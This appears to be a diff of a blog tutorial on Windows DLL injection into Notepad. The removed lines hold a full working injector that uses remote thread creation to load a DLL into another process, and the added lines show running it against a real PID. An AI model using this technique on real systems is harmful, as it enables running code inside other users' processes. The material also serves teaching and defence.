@@ -365,62 +365,20 @@ void InjectDLL(DWORD processID, const char* dllPath) {
 
 ```
 
-Now we can execute our Injector function in a main function to see this implementation. we should first get the pid of the desired target process ( Lets take Notepad as example ).
+Now we can execute our Injector function in a main function to see this implementation. But first let's implement the Injected DLL cpp code and the commande g++ - shared InjectedDLL.dll InjectedDLL.cpp to transform the code to a DLL. After doing that we should have the DLL, The only thing remains is choosing notepad as a target process, get the pid of it from Process Explorer which is a program that monitor processes.
 
-```The Full Injector code version```
+![ProcessPID](/favicon/2.jpeg)
+
+We can see that the PID is ```14348```
+Now let's execute our injector code.
+
+```Executing our Injector```
 ```cpp
 // Injector.cpp
-#include <windows.h>
-#include <iostream>
-
-void InjectDLL(DWORD processID, const char* dllPath) {
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
-    if (!hProcess) {
-        std::cerr << "OpenProcess failed!" << std::endl;
-        return;
-    }
-
-    // Allocate memory in the target process
-    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    if (!pRemoteMemory) {
-        std::cerr << "VirtualAllocEx failed!" << std::endl;
-        CloseHandle(hProcess);
-        return;
-    }
-
-    // Write the DLL path to the allocated memory
-    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
-        std::cerr << "WriteProcessMemory failed!" << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return;
-    }
-
-    // Get the address of LoadLibraryA
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
-
-    // Create a remote thread that calls LoadLibraryA
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
-    if (!hThread) {
-        std::cerr << "CreateRemoteThread failed!" << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return;
-    }
-
-    // Wait for the remote thread to complete
-    WaitForSingleObject(hThread, INFINITE);
-
-    // Clean up
-    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-}
 
 int main() {
-    DWORD processID = 1234; // Replace with the target process ID
-    const char* dllPath = "C:\\path\\to\\InjectedDLL.dll";
+    DWORD processID = 14348; // Replace with the target process ID
+    const char* dllPath = "C:\\Users\\hp\\InjectedDLL.dll";
 
     if (InjectDLL(processID, dllPath)) {
         std::cout << "DLL injected successfully!" << std::endl;
@@ -431,3 +389,8 @@ int main() {
     return 0;
 }
 ```
+
+
+![ProcessPID](/favicon/4.jpeg)
+
+Boooooom, I got you
